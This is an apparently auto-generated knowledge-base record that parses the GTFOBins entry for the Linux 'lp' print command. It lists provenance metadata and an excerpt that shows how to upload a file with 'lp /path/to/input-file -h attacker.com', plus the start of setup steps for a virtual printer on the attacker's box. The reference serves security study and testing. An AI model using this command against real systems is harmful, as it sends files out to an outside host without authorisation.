---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# lp

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `lp` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/lp` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for lp covering upload.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/lp.md)
- Source verification: [source record](../../sources/gtfobins/lp.md)

## Aliases

- `lp`

## Source Verification

[source record](../../sources/gtfobins/lp.md)

## Evidence Excerpt

```text
_body: ''
_name: lp
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/lp
functions:
upload:
- code: lp /path/to/input-file -h attacker.com
comment: 'This requires `cups` to be installed. Run the following on the attacker box beforehand:
1. `lpadmin -p printer -v socket://localhost -E` to create a virtual printer;
```
